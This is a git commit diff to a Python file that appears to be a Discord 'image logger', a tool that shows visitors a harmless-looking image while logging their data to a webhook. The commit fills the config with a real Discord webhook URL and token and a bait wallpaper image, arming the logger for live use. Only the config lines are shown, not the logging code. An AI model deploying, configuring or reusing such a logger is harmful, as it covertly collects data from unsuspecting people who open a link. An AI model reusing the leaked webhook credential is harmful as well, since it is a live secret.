c187db241d18faf1b0702bc023154aae0c3100d8
skitzoaphrabia <agafaghfahgfaghb@gmail.com>
2025-06-28 21:35:05 -0700

    Kenncarson.py

--- api/Kenncarson.py
+++ api/Kenncarson.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1388734849409482905/jhm95DMH-A3Tx4Bc0hqliJgTYNIJhSd1YF9b8UPkoJPNg8HWg_yTepx1QIR1iLoBoxzG",
+    "image": "https://wallpapercave.com/wp/wp9791192.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
